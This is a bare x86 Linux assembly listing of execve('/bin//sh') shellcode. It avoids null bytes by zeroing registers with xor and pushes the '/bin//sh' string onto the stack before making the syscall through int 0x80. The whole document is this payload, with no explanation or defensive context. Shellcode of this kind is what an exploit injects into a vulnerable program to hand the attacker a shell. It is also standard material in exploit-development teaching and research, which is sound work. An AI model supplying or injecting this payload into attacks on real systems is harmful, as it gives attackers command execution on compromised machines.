section .text
    global _start

_start:
    xor eax, eax
    push eax
    push dword 0x68732f2f   ; "//sh"
    push dword 0x6e69622f   ; "/bin"
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 11              ; execve syscall
    int 0x80